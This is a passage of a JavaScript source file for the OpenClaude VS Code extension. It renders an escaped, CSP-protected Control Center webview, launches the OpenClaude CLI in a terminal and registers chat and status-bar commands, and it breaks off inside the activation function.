const vscode = require('vscode');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const {
  chooseLaunchWorkspace,
  describeProviderState,
  findCommandPath,
  isPathInsideWorkspace,
  parseProfileFile,
  resolveCommandCheckPath,
} = require('./state');
const { buildControlCenterViewModel } = require('./presentation');
const { ChatController, OpenClaudeChatViewProvider, OpenClaudeChatPanelManager } = require('./chat/chatProvider');
const { SessionManager } = require('./chat/sessionManager');
const { DiffContentProvider, SCHEME: DIFF_SCHEME } = require('./chat/diffController');

const OPENCLAUDE_REPO_URL = 'https://github.com/Gitlawb/openclaude';
const OPENCLAUDE_SETUP_URL = 'https://github.com/Gitlawb/openclaude/blob/main/README.md#quick-start';
const PROFILE_FILE_NAME = '.openclaude-profile.json';

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

async function isCommandAvailable(command, launchCwd) {
  return Boolean(findCommandPath(command, { cwd: launchCwd }));
}

function getExecutableFromCommand(command) {
  const normalized = String(command || '').trim();
  if (!normalized) {
    return '';
  }

  const doubleQuotedMatch = normalized.match(/^"([^"]+)"/);
  if (doubleQuotedMatch) {
    return doubleQuotedMatch[1];
  }

  const singleQuotedMatch = normalized.match(/^'([^']+)'/);
  if (singleQuotedMatch) {
    return singleQuotedMatch[1];
  }

  return normalized.split(/\s+/)[0];
}

function getWorkspacePaths() {
  return (vscode.workspace.workspaceFolders || []).map(folder => folder.uri.fsPath);
}

function getActiveWorkspacePath() {
  const editor = vscode.window.activeTextEditor;
  if (!editor || editor.document.uri.scheme !== 'file') {
    return null;
  }

  const workspaceFolder = vscode.workspace.getWorkspaceFolder(editor.document.uri);
  return workspaceFolder ? workspaceFolder.uri.fsPath : null;
}

function getActiveFilePath() {
  const editor = vscode.window.activeTextEditor;
  if (!editor || editor.document.uri.scheme !== 'file') {
    return null;
  }

  return editor.document.uri.fsPath || null;
}

function resolveLaunchTargets({ activeFilePath, workspacePath, workspaceSourceLabel, executable } = {}) {
  const activeFileDirectory = isPathInsideWorkspace(activeFilePath, workspacePath)
    ? path.dirname(activeFilePath)
    : null;
  const normalizedExecutable = String(executable || '').trim();
  const commandPath = normalizedExecutable
    ? resolveCommandCheckPath(normalizedExecutable, workspacePath)
    : null;
  const relativeCommandRequiresWorkspaceRoot = Boolean(
    workspacePath && commandPath && !path.isAbsolute(normalizedExecutable),
  );

  if (relativeCommandRequiresWorkspaceRoot) {
    return {
      projectAwareCwd: workspacePath,
      projectAwareCwdLabel: workspacePath,
      projectAwareSourceLabel: 'workspace root (required by relative launch command)',
      workspaceRootCwd: workspacePath,
      workspaceRootCwdLabel: workspacePath,
      launchActionsShareTarget: true,
      launchActionsShareTargetReason: 'relative-launch-command',
    };
  }

  if (activeFileDirectory) {
    return {
      projectAwareCwd: activeFileDirectory,
      projectAwareCwdLabel: activeFileDirectory,
      projectAwareSourceLabel: 'active file directory',
      workspaceRootCwd: workspacePath || null,
      workspaceRootCwdLabel: workspacePath || 'No workspace open',
      launchActionsShareTarget: false,
      launchActionsShareTargetReason: null,
    };
  }

  if (workspacePath) {
    return {
      projectAwareCwd: workspacePath,
      projectAwareCwdLabel: workspacePath,
      projectAwareSourceLabel: workspaceSourceLabel || 'workspace root',
      workspaceRootCwd: workspacePath,
      workspaceRootCwdLabel: workspacePath,
      launchActionsShareTarget: true,
      launchActionsShareTargetReason: null,
    };
  }

  return {
    projectAwareCwd: null,
    projectAwareCwdLabel: 'VS Code default terminal cwd',
    projectAwareSourceLabel: 'VS Code default terminal cwd',
    workspaceRootCwd: null,
    workspaceRootCwdLabel: 'No workspace open',
    launchActionsShareTarget: false,
    launchActionsShareTargetReason: null,
  };
}

function resolveLaunchWorkspace() {
  return chooseLaunchWorkspace({
    activeWorkspacePath: getActiveWorkspacePath(),
    workspacePaths: getWorkspacePaths(),
  });
}

function getWorkspaceSourceLabel(source) {
  switch (source) {
    case 'active-workspace':
      return 'active editor workspace';
    case 'first-workspace':
      return 'first workspace folder';
    default:
      return 'no workspace open';
  }
}

function getProviderSourceLabel(source) {
  switch (source) {
    case 'profile':
      return 'saved profile';
    case 'env':
      return 'environment';
    case 'shim':
      return 'launch setting';
    default:
      return 'unknown';
  }
}

function readWorkspaceProfile(profilePath) {
  if (!profilePath || !fs.existsSync(profilePath)) {
    return {
      profile: null,
      statusLabel: 'Missing',
      statusHint: `${PROFILE_FILE_NAME} not found in the workspace root`,
      filePath: null,
    };
  }

  try {
    const raw = fs.readFileSync(profilePath, 'utf8');
    const profile = parseProfileFile(raw);
    if (!profile) {
      return {
        profile: null,
        statusLabel: 'Invalid',
        statusHint: `${profilePath} has invalid JSON or an unsupported profile`,
        filePath: profilePath,
      };
    }

    return {
      profile,
      statusLabel: 'Found',
      statusHint: profilePath,
      filePath: profilePath,
    };
  } catch (error) {
    return {
      profile: null,
      statusLabel: 'Unreadable',
      statusHint: `${profilePath} (${error instanceof Error ? error.message : 'read failed'})`,
      filePath: profilePath,
    };
  }
}

async function collectControlCenterState() {
  const configured = vscode.workspace.getConfiguration('openclaude');
  const launchCommand = configured.get('launchCommand', 'openclaude');
  const terminalName = configured.get('terminalName', 'OpenClaude');
  const shimEnabled = configured.get('useOpenAIShim', false);
  const executable = getExecutableFromCommand(launchCommand);
  const launchWorkspace = resolveLaunchWorkspace();
  const workspaceFolder = launchWorkspace.workspacePath;
  const workspaceSourceLabel = getWorkspaceSourceLabel(launchWorkspace.source);
  const launchTargets = resolveLaunchTargets({
    activeFilePath: getActiveFilePath(),
    workspacePath: workspaceFolder,
    workspaceSourceLabel,
    executable,
  });
  const installed = await isCommandAvailable(executable, launchTargets.projectAwareCwd);
  const profilePath = workspaceFolder
    ? path.join(workspaceFolder, PROFILE_FILE_NAME)
    : null;

  const profileState = workspaceFolder
    ? readWorkspaceProfile(profilePath)
    : {
        profile: null,
        statusLabel: 'No workspace',
        statusHint: 'Open a workspace folder to detect a saved profile',
        filePath: null,
      };

  const providerState = describeProviderState({
    shimEnabled,
    env: process.env,
    profile: profileState.profile,
  });

  return {
    installed,
    executable,
    launchCommand,
    terminalName,
    shimEnabled,
    workspaceFolder,
    workspaceSourceLabel,
    launchCwd: launchTargets.projectAwareCwd,
    launchCwdLabel: launchTargets.projectAwareCwdLabel,
    launchCwdSourceLabel: launchTargets.projectAwareSourceLabel,
    workspaceRootCwd: launchTargets.workspaceRootCwd,
    workspaceRootCwdLabel: launchTargets.workspaceRootCwdLabel,
    launchActionsShareTarget: launchTargets.launchActionsShareTarget,
    launchActionsShareTargetReason: launchTargets.launchActionsShareTargetReason,
    canLaunchInWorkspaceRoot: Boolean(workspaceFolder),
    profileStatusLabel: profileState.statusLabel,
    profileStatusHint: profileState.statusHint,
    workspaceProfilePath: profileState.filePath,
    providerState,
    providerSourceLabel: getProviderSourceLabel(providerState.source),
  };
}

async function launchOpenClaude(options = {}) {
  const { requireWorkspace = false } = options;
  const configured = vscode.workspace.getConfiguration('openclaude');
  const launchCommand = configured.get('launchCommand', 'openclaude');
  const terminalName = configured.get('terminalName', 'OpenClaude');
  const shimEnabled = configured.get('useOpenAIShim', false);
  const executable = getExecutableFromCommand(launchCommand);
  const launchWorkspace = resolveLaunchWorkspace();

  if (requireWorkspace && !launchWorkspace.workspacePath) {
    await vscode.window.showWarningMessage(
      'Open a workspace folder before using Launch in Workspace Root.',
    );
    return;
  }

  const launchTargets = resolveLaunchTargets({
    activeFilePath: getActiveFilePath(),
    workspacePath: launchWorkspace.workspacePath,
    workspaceSourceLabel: getWorkspaceSourceLabel(launchWorkspace.source),
    executable,
  });
  const targetCwd = requireWorkspace
    ? launchTargets.workspaceRootCwd
    : launchTargets.projectAwareCwd;
  const installed = await isCommandAvailable(executable, targetCwd);

  if (!installed) {
    const action = await vscode.window.showErrorMessage(
      `OpenClaude command not found: ${executable}. Install it with: npm install -g @gitlawb/openclaude`,
      'Open Setup Guide',
      'Open Repository',
    );

    if (action === 'Open Setup Guide') {
      await vscode.env.openExternal(vscode.Uri.parse(OPENCLAUDE_SETUP_URL));
    } else if (action === 'Open Repository') {
      await vscode.env.openExternal(vscode.Uri.parse(OPENCLAUDE_REPO_URL));
    }

    return;
  }

  const env = {};
  if (shimEnabled) {
    env.CLAUDE_CODE_USE_OPENAI = '1';
  }

  const terminalOptions = {
    name: terminalName,
    env,
  };

  if (targetCwd) {
    terminalOptions.cwd = targetCwd;
  }

  const terminal = vscode.window.createTerminal(terminalOptions);
  terminal.show(true);
  terminal.sendText(launchCommand, true);
}

async function openWorkspaceProfile() {
  const state = await collectControlCenterState();

  if (!state.workspaceProfilePath) {
    await vscode.window.showInformationMessage(
      `No ${PROFILE_FILE_NAME} file was found for the current workspace.`,
    );
    return;
  }

  const document = await vscode.workspace.openTextDocument(
    vscode.Uri.file(state.workspaceProfilePath),
  );
  await vscode.window.showTextDocument(document, { preview: false });
}

function getToneClass(tone) {
  switch (tone) {
    case 'accent':
      return 'tone-accent';
    case 'positive':
      return 'tone-positive';
    case 'warning':
      return 'tone-warning';
    case 'critical':
      return 'tone-critical';
    default:
      return 'tone-neutral';
  }
}

function renderHeaderBadge(badge) {
  return `<div class="rail-pill ${getToneClass(badge.tone)}" title="${escapeHtml(badge.label)}: ${escapeHtml(badge.value)}">
    <span class="rail-label">${escapeHtml(badge.label)}</span>
    <span class="rail-value">${escapeHtml(badge.value)}</span>
  </div>`;
}

function renderSummaryCard(card) {
  const detail = card.detail || '';
  return `<section class="summary-card" aria-label="${escapeHtml(card.label)}">
    <div class="summary-label">${escapeHtml(card.label)}</div>
    <div class="summary-value" title="${escapeHtml(card.value)}">${escapeHtml(card.value)}</div>
    ${detail ? `<div class="summary-detail" title="${escapeHtml(detail)}">${escapeHtml(detail)}</div>` : ''}
  </section>`;
}

function renderDetailRow(row) {
  return `<div class="detail-row ${getToneClass(row.tone)}">
    <div class="detail-label">${escapeHtml(row.label)}</div>
    <div class="detail-summary" title="${escapeHtml(row.summary)}">${escapeHtml(row.summary)}</div>
    ${row.detail ? `<div class="detail-meta" title="${escapeHtml(row.detail)}">${escapeHtml(row.detail)}</div>` : ''}
  </div>`;
}

function renderDetailSection(section) {
  const sectionId = `section-${String(section.title || 'section').toLowerCase().replace(/[^a-z0-9]+/g, '-')}`;
  return `<section class="detail-module" aria-labelledby="${escapeHtml(sectionId)}">
    <h2 class="module-title" id="${escapeHtml(sectionId)}">${escapeHtml(section.title)}</h2>
    <div class="detail-list">${section.rows.map(renderDetailRow).join('')}</div>
  </section>`;
}

function renderActionButton(action, variant = 'secondary') {
  return `<button class="action-button ${variant}" id="${escapeHtml(action.id)}" type="button" ${action.disabled ? 'disabled aria-disabled="true"' : ''}>
    <span class="action-label">${escapeHtml(action.label)}</span>
    <span class="action-detail">${escapeHtml(action.detail)}</span>
  </button>`;
}

function renderProfileEmptyState(detail) {
  return `<div class="action-empty" role="status" aria-live="polite">
    <div class="action-empty-title">No workspace profile yet</div>
    <div class="action-empty-detail">${escapeHtml(detail)}</div>
  </div>`;
}

function getPrimaryLaunchActionDetail(status) {
  if (status.launchActionsShareTargetReason === 'relative-launch-command' && status.launchCwd) {
    return `Project-aware launch is anchored to the workspace root by the relative command · ${status.launchCwdLabel}`;
  }

  if (status.launchCwd && status.launchCwdSourceLabel === 'active file directory') {
    return `Starts beside the active file · ${status.launchCwdLabel}`;
  }

  if (status.launchCwd) {
    return `Project-aware launch. Currently resolves to ${status.launchCwdSourceLabel} · ${status.launchCwdLabel}`;
  }

  return 'Project-aware launch. Uses the VS Code default terminal cwd';
}

function getWorkspaceRootActionDetail(status, fallbackDetail) {
  if (!status.canLaunchInWorkspaceRoot) {
    return fallbackDetail;
  }

  if (status.launchActionsShareTargetReason === 'relative-launch-command') {
    return `Same workspace-root target as Launch OpenClaude because the relative command resolves from the workspace root · ${status.workspaceRootCwdLabel}`;
  }

  return `Always starts at the workspace root · ${status.workspaceRootCwdLabel}`;
}

function getRenderableViewModel(status) {
  const viewModel = buildControlCenterViewModel(status);
  const summaryCards = viewModel.summaryCards.map(card => {
    if (card.key !== 'launchCwd' || card.detail) {
      return card;
    }

    return {
      ...card,
      detail: status.launchCwdSourceLabel || '',
    };
  });

  return {
    ...viewModel,
    summaryCards,
    actions: {
      ...viewModel.actions,
      primary: {
        ...viewModel.actions.primary,
        detail: getPrimaryLaunchActionDetail(status),
      },
      launchRoot: {
        ...viewModel.actions.launchRoot,
        detail: getWorkspaceRootActionDetail(status, viewModel.actions.launchRoot.detail),
      },
    },
  };
}

function renderControlCenterHtml(status, options = {}) {
  const nonce = options.nonce || crypto.randomBytes(16).toString('base64');
  const platform = options.platform || process.platform;
  const viewModel = getRenderableViewModel(status);
  const profileActionOrEmpty = viewModel.actions.openProfile
    ? renderActionButton(viewModel.actions.openProfile)
    : renderProfileEmptyState(status.profileStatusHint || 'Open a workspace folder to detect a saved profile');

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; script-src 'nonce-${nonce}';" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    :root {
      --oc-bg: #050505;
      --oc-panel: #110d0c;
      --oc-panel-strong: #17110f;
      --oc-panel-soft: #1d1512;
      --oc-border: #645041;
      --oc-border-soft: rgba(220, 195, 170, 0.14);
      --oc-text: #f7efe5;
      --oc-text-dim: #dcc3aa;
      --oc-text-soft: #aa9078;
      --oc-accent: #d77757;
      --oc-accent-bright: #f09464;
      --oc-accent-soft: rgba(240, 148, 100, 0.18);
      --oc-positive: #e8b86b;
      --oc-warning: #f3c969;
      --oc-critical: #ff8a6c;
      --oc-focus: #ffd3a1;
    }
    * {
      box-sizing: border-box;
    }
    h1, h2, p {
      margin: 0;
    }
    html, body {
      margin: 0;
      min-height: 100%;
    }
    body {
      padding: 16px;
      font-family: var(--vscode-font-family, "Segoe UI", sans-serif);
      color: var(--oc-text);
      background:
        radial-gradient(circle at top right, rgba(240, 148, 100, 0.16), transparent 34%),
        radial-gradient(circle at 20% 0%, rgba(215, 119, 87, 0.14), transparent 28%),
        linear-gradient(180deg, #090706, #050505 58%, #090706);
      line-height: 1.45;
    }
    button {
      font: inherit;
    }
    .shell {
      position: relative;
      overflow: hidden;
      border: 1px solid var(--oc-border-soft);
      border-radius: 20px;
      background:
        linear-gradient(180deg, rgba(255, 255, 255, 0.02), transparent 16%),
        linear-gradient(180deg, rgba(17, 13, 12, 0.98), rgba(9, 7, 6, 0.98));
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.35), inset 0 1px 0 rgba(255, 255, 255, 0.03);
    }
    .shell::before {
      content: "";
      position: absolute;
      inset: 0 0 auto;
      height: 2px;
      background: linear-gradient(90deg, #ffb464, #f09464, #d77757, #814334);
      opacity: 0.95;
    }
    .sunset-gradient {
      background: linear-gradient(90deg, #ffb464, #f09464, #d77757, #814334);
    }
    .frame {
      display: grid;
      gap: 18px;
      padding: 18px;
    }
    .hero {
      display: grid;
      gap: 14px;
      padding: 18px;
      border-radius: 16px;
      background:
        linear-gradient(135deg, rgba(240, 148, 100, 0.06), rgba(215, 119, 87, 0.02) 55%, transparent),
        var(--oc-panel);
      border: 1px solid var(--oc-border-soft);
    }
    .hero-top {
      display: flex;
      align-items: flex-start;
      justify-content: space-between;
      gap: 16px;
      flex-wrap: wrap;
    }
    .brand {
      display: grid;
      gap: 6px;
      min-width: 0;
    }
    .eyebrow {
      font-size: 11px;
      letter-spacing: 0.14em;
      text-transform: uppercase;
      color: var(--oc-text-soft);
    }
    .wordmark {
      font-size: 24px;
      line-height: 1;
      font-weight: 700;
      letter-spacing: -0.03em;
      color: var(--oc-text);
    }
    .wordmark-accent {
      color: var(--oc-accent-bright);
    }
    .headline {
      display: grid;
      gap: 4px;
      max-width: 44ch;
    }
    .headline-title {
      font-size: 15px;
      font-weight: 600;
      color: var(--oc-text);
    }
    .headline-subtitle {
      font-size: 12px;
      color: var(--oc-text-dim);
    }
    .status-rail {
      display: flex;
      flex-wrap: wrap;
      gap: 8px;
      align-items: center;
      justify-content: flex-end;
      flex: 1 1 250px;
    }
    .rail-pill {
      display: grid;
      gap: 2px;
      min-width: 94px;
      padding: 8px 10px;
      border-radius: 999px;
      border: 1px solid var(--oc-border-soft);
      background: rgba(255, 255, 255, 0.02);
    }
    .rail-label {
      font-size: 10px;
      letter-spacing: 0.1em;
      text-transform: uppercase;
      color: var(--oc-text-soft);
    }
    .rail-value {
      font-size: 12px;
      font-weight: 700;
      color: var(--oc-text);
    }
    .refresh-button {
      border: 1px solid rgba(240, 148, 100, 0.28);
      border-radius: 999px;
      padding: 8px 12px;
      background: rgba(240, 148, 100, 0.08);
      color: var(--oc-text-dim);
      cursor: pointer;
      white-space: nowrap;
    }
    .summary-grid {
      display: grid;
      gap: 12px;
      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
    }
    .summary-card {
      display: grid;
      gap: 6px;
      min-width: 0;
      padding: 14px;
      border-radius: 14px;
      background: var(--oc-panel-strong);
      border: 1px solid var(--oc-border-soft);
    }
    .summary-label,
    .detail-label,
    .module-title,
    .action-section-title,
    .support-title {
      font-size: 10px;
      letter-spacing: 0.12em;
      text-transform: uppercase;
      color: var(--oc-text-soft);
    }
    .summary-value,
    .detail-summary {
      min-width: 0;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
      font-size: 13px;
      font-weight: 600;
      color: var(--oc-text);
    }
    .summary-detail,
    .detail-meta,
    .action-detail,
    .action-empty-detail,
    .support-copy,
    .footer-note {
      font-size: 12px;
      color: var(--oc-text-dim);
    }
    .modules {
      display: grid;
      gap: 14px;
      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
    }
    .detail-module,
    .support-card {
      display: grid;
      gap: 12px;
      padding: 16px;
      border-radius: 16px;
      background: var(--oc-panel);
      border: 1px solid var(--oc-border-soft);
    }
    .detail-list,
    .action-stack,
    .support-stack {
      display: grid;
      gap: 10px;
    }
    .detail-row {
      display: grid;
      gap: 4px;
      min-width: 0;
      padding: 12px;
      border-radius: 12px;
      background: rgba(255, 255, 255, 0.02);
      border: 1px solid rgba(220, 195, 170, 0.08);
    }
    .actions-layout {
      display: grid;
      gap: 14px;
      grid-template-columns: minmax(0, 1.35fr) minmax(0, 1fr);
      align-items: start;
    }
    .action-panel {
      display: grid;
      gap: 12px;
      padding: 16px;
      border-radius: 16px;
      background: var(--oc-panel);
      border: 1px solid var(--oc-border-soft);
    }
    .action-button {
      width: 100%;
      display: grid;
      gap: 4px;
      padding: 14px;
      text-align: left;
      border-radius: 14px;
      border: 1px solid rgba(220, 195, 170, 0.14);
      background: rgba(255, 255, 255, 0.02);
      color: var(--oc-text);
      cursor: pointer;
      transition: border-color 140ms ease, transform 140ms ease, background 140ms ease, box-shadow 140ms ease;
    }
    .action-button.primary {
      border-color: rgba(240, 148, 100, 0.44);
      background:
        linear-gradient(135deg, rgba(255, 180, 100, 0.22), rgba(215, 119, 87, 0.12) 58%, rgba(129, 67, 52, 0.12)),
        #241713;
      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.05);
    }
    .action-button.secondary:hover:enabled,
    .action-button.primary:hover:enabled,
    .refresh-button:hover {
      border-color: rgba(240, 148, 100, 0.48);
      transform: translateY(-1px);
      background-color: rgba(240, 148, 100, 0.1);
    }
    .action-button:disabled {
      cursor: not-allowed;
      opacity: 0.58;
      transform: none;
    }
    .action-label,
    .action-empty-title,
    .support-link-label {
      font-size: 13px;
      font-weight: 700;
      color: var(--oc-text);
    }
    .action-empty {
      display: grid;
      gap: 4px;
      padding: 14px;
      border-radius: 14px;
      border: 1px dashed rgba(220, 195, 170, 0.16);
      background: rgba(255, 255, 255, 0.015);
    }
    .support-link {
      width: 100%;
      display: grid;
      gap: 4px;
      padding: 12px 0;
      border: 0;
      border-top: 1px solid rgba(220, 195, 170, 0.08);
      background: transparent;
      color: inherit;
      cursor: pointer;
      text-align: left;
    }
    .support-link:first-of-type {
      border-top: 0;
      padding-top: 0;
    }
    .tone-positive .rail-value,
    .tone-positive .detail-summary {
      color: var(--oc-positive);
    }
    .tone-warning .rail-value,
    .tone-warning .detail-summary {
      color: var(--oc-warning);
    }
    .tone-critical .rail-value,
    .tone-critical .detail-summary {
      color: var(--oc-critical);
    }
    .tone-accent .rail-value,
    .tone-accent .detail-summary {
      color: var(--oc-accent-bright);
    }
    .action-button:focus-visible,
    .support-link:focus-visible,
    .refresh-button:focus-visible {
      outline: 2px solid var(--oc-focus);
      outline-offset: 2px;
      box-shadow: 0 0 0 4px rgba(255, 211, 161, 0.16);
    }
    code {
      padding: 1px 6px;
      border-radius: 999px;
      border: 1px solid rgba(240, 148, 100, 0.18);
      background: rgba(240, 148, 100, 0.08);
      color: var(--oc-accent-bright);
      font-family: var(--vscode-editor-font-family, Consolas, monospace);
      font-size: 11px;
    }
    .footer-note {
      padding-top: 2px;
    }
    @media (max-width: 720px) {
      body {
        padding: 12px;
      }
      .frame,
      .hero {
        padding: 14px;
      }
      .actions-layout {
        grid-template-columns: 1fr;
      }
      .status-rail {
        justify-content: flex-start;
      }
      .rail-pill {
        min-width: 0;
      }
    }
  </style>
</head>
<body>
  <main class="shell" aria-labelledby="control-center-title">
    <div class="frame">
      <header class="hero">
        <div class="hero-top">
          <div class="brand">
            <div class="eyebrow">${escapeHtml(viewModel.header.eyebrow)}</div>
            <div class="wordmark" aria-label="OpenClaude wordmark">Open<span class="wordmark-accent">Claude</span></div>
            <div class="headline">
              <h1 class="headline-title" id="control-center-title">${escapeHtml(viewModel.header.title)}</h1>
              <p class="headline-subtitle">${escapeHtml(viewModel.header.subtitle)}</p>
            </div>
          </div>
          <div class="status-rail" role="group" aria-label="Runtime, provider, and profile status">
            ${viewModel.headerBadges.map(renderHeaderBadge).join('')}
            <button class="refresh-button" id="refresh" type="button">Refresh</button>
          </div>
        </div>
        <section class="summary-grid" aria-label="Current launch summary">
          ${viewModel.summaryCards.map(renderSummaryCard).join('')}
        </section>
      </header>

      <section class="modules" aria-label="Control center details">
        ${viewModel.detailSections.map(renderDetailSection).join('')}
      </section>

      <section class="actions-layout" aria-label="Control center actions">
        <section class="action-panel" aria-labelledby="actions-title">
          <h2 class="action-section-title" id="actions-title">Launch & Project</h2>
          ${renderActionButton(viewModel.actions.primary, 'primary')}
          <div class="action-stack">
            ${renderActionButton(viewModel.actions.launchRoot)}
            ${profileActionOrEmpty}
          </div>
        </section>

        <section class="support-card" aria-labelledby="quick-links-title">
          <h2 class="support-title" id="quick-links-title">Quick Links</h2>
          <div class="support-copy">Settings and workspace status stay in view here. Reference links stay secondary.</div>
          <div class="support-stack">
            <button class="support-link" id="setup" type="button">
              <span class="support-link-label">Open Setup Guide</span>
              <span class="summary-detail">Jump to install and provider setup docs.</span>
            </button>
            <button class="support-link" id="repo" type="button">
              <span class="support-link-label">Open Repository</span>
              <span class="summary-detail">Browse the upstream OpenClaude project.</span>
            </button>
            <button class="support-link" id="commands" type="button">
              <span class="support-link-label">Open Command Palette</span>
              <span class="summary-detail">Access VS Code and OpenClaude commands quickly.</span>
            </button>
          </div>
        </section>
      </section>

      <p class="footer-note">
        Quick trigger: use <code>${escapeHtml(platform === 'darwin' ? 'Cmd+Shift+P' : 'Ctrl+Shift+P')}</code> for the command palette, then refresh this panel after workspace or profile changes.
      </p>
    </div>
  </main>

  <script nonce="${nonce}">
    const vscode = acquireVsCodeApi();
    document.getElementById('launch').addEventListener('click', () => vscode.postMessage({ type: 'launch' }));
    document.getElementById('launchRoot').addEventListener('click', () => vscode.postMessage({ type: 'launchRoot' }));
    document.getElementById('repo').addEventListener('click', () => vscode.postMessage({ type: 'repo' }));
    document.getElementById('setup').addEventListener('click', () => vscode.postMessage({ type: 'setup' }));
    document.getElementById('commands').addEventListener('click', () => vscode.postMessage({ type: 'commands' }));
    document.getElementById('refresh').addEventListener('click', () => vscode.postMessage({ type: 'refresh' }));

    const profileButton = document.getElementById('openProfile');
    if (profileButton) {
      profileButton.addEventListener('click', () => vscode.postMessage({ type: 'openProfile' }));
    }
  </script>
</body>
</html>`;
}

class OpenClaudeControlCenterProvider {
  constructor() {
    this.webviewView = null;
  }

  async resolveWebviewView(webviewView) {
    this.webviewView = webviewView;
    webviewView.webview.options = { enableScripts: true };

    webviewView.onDidDispose(() => {
      if (this.webviewView === webviewView) {
        this.webviewView = null;
      }
    });

    webviewView.webview.onDidReceiveMessage(async message => {
      switch (message?.type) {
        case 'launch':
          await launchOpenClaude();
          break;
        case 'launchRoot':
          await launchOpenClaude({ requireWorkspace: true });
          break;
        case 'openProfile':
          await openWorkspaceProfile();
          break;
        case 'repo':
          await vscode.env.openExternal(vscode.Uri.parse(OPENCLAUDE_REPO_URL));
          break;
        case 'setup':
          await vscode.env.openExternal(vscode.Uri.parse(OPENCLAUDE_SETUP_URL));
          break;
        case 'commands':
          await vscode.commands.executeCommand('workbench.action.showCommands');
          break;
        case 'refresh':
        default:
          break;
      }

      await this.refresh();
    });

    await this.refresh();
  }

  async refresh() {
    if (!this.webviewView) {
      return;
    }

    try {
      const status = await collectControlCenterState();
      this.webviewView.webview.html = this.getHtml(status);
    } catch (error) {
      this.webviewView.webview.html = this.getErrorHtml(error);
    }
  }

  getErrorHtml(error) {
    const nonce = crypto.randomBytes(16).toString('base64');
    const message =
      error instanceof Error ? error.message : 'Unknown Control Center error';

    return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; script-src 'nonce-${nonce}';" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      font-family: var(--vscode-font-family);
      padding: 16px;
      color: var(--vscode-foreground);
      background: var(--vscode-sideBar-background);
    }
    .panel {
      border: 1px solid var(--vscode-errorForeground);
      border-radius: 8px;
      padding: 14px;
      background: color-mix(in srgb, var(--vscode-sideBar-background) 88%, black);
    }
    .title {
      color: var(--vscode-errorForeground);
      font-weight: 700;
      margin-bottom: 8px;
    }
    .message {
      color: var(--vscode-descriptionForeground);
      margin-bottom: 12px;
      line-height: 1.5;
    }
    button {
      border: 1px solid var(--vscode-button-border, transparent);
      background: var(--vscode-button-background);
      color: var(--vscode-button-foreground);
      border-radius: 6px;
      padding: 8px 10px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="panel">
    <div class="title">Control Center Error</div>
    <div class="message">${escapeHtml(message)}</div>
    <button id="refresh">Refresh</button>
  </div>
  <script nonce="${nonce}">
    const vscode = acquireVsCodeApi();
    document.getElementById('refresh').addEventListener('click', () => {
      vscode.postMessage({ type: 'refresh' });
    });
  </script>
</body>
</html>`;
  }

  getHtml(status) {
    const nonce = crypto.randomBytes(16).toString('base64');
    return renderControlCenterHtml(status, { nonce, platform: process.platform });
  }
}

/**
 * @param {vscode.ExtensionContext} context
 */
function activate(context) {
  // ── Control Center (existing) ──
  const provider = new OpenClaudeControlCenterProvider();
  const refreshProvider = () => {
    void provider.refresh();
  };

  // ── Chat system ──
  const sessionManager = new SessionManager();
  const folders = vscode.workspace.workspaceFolders;
  if (folders && folders.length > 0) {
    sessionManager.setCwd(folders[0].uri.fsPath);
  }

  const chatController = new ChatController(sessionManager);
  const chatViewProvider = new OpenClaudeChatViewProvider(chatController);
  const chatPanelManager = new OpenClaudeChatPanelManager(chatController);

  // ── Diff content provider ──
  const diffProvider = new DiffContentProvider();
  const diffProviderReg = vscode.workspace.registerTextDocumentContentProvider(
    DIFF_SCHEME,
    diffProvider,
  );

  // ── Status bar ──
  const statusBarItem = vscode.window.createStatusBarItem(
    vscode.StatusBarAlignment.Right,
    100,
  );
  statusBarItem.text = '$(comment-discussion) OpenClaude';
  statusBarItem.tooltip = 'Open OpenClaude Chat';
  statusBarItem.command = 'openclaude.openChat';
  statusBarItem.show();

  chatController.onDidChangeState((state) => {
    switch (state) {
      case 'streaming':
        statusBarItem.text = '$(sync~spin) OpenClaude';
        statusBarItem.tooltip = 'OpenClaude is generating...';
        break;
      case 'connected':
        statusBarItem.text = '$(comment-discussion) OpenClaude';
        statusBarItem.tooltip = 'OpenClaude connected';
        break;
      default:
        statusBarItem.text = '$(comment-discussion) OpenClaude';
        statusBarItem.tooltip = 'Open OpenClaude Chat';
        break;
    }
  });

  // ── Existing commands ──
  const startCommand = vscode.commands.registerCommand('openclaude.start', async () => {
    await launchOpenClaude();
  });

  const startInWorkspaceRootCommand = vscode.commands.registerCommand(
    'openclaude.startInWorkspaceRoot',
    async () => {
      await launchOpenClaude({ requireWorkspace: true });
    },
  );

  const openDocsCommand = vscode.commands.registerCommand('openclaude.openDocs', async () => {
    await vscode.env.openExternal(vscode.Uri.parse(OPENCLAUDE_REPO_URL));
  });

  const openSetupDocsCommand = vscode.commands.registerCommand(
    'openclaude.openSetupDocs',
    async () => {
      await vscode.env.openExternal(vscode.Uri.parse(OPENCLAUDE_SETUP_URL));
    },
  );

  const openWorkspaceProfileCommand = vscode.commands.registerCommand(
    'openclaude.openWorkspaceProfile',
    async () => {
      await openWorkspaceProfile();
    },
  );

  const openUiCommand = vscode.commands.registerCommand('openclaude.openControlCenter', async () => {
    await vscode.commands.executeCommand('workbench.view.extension.openclaude');
  });

  // ── New chat commands ──
  const newChatCommand = vscode.commands.registerCommand('openclaude.newChat', () => {
    chatController.stopSession();
    chatController.broadcast({ type: 'session_cleared' });
  });

  const openChatCommand = vscode.commands.registerCommand('openclaude.openChat', () => {
    chatPanelManager.openPanel();
  });

  const resumeSessionCommand = vscode.commands.registerCommand('openclaude.resumeSession', async () => {
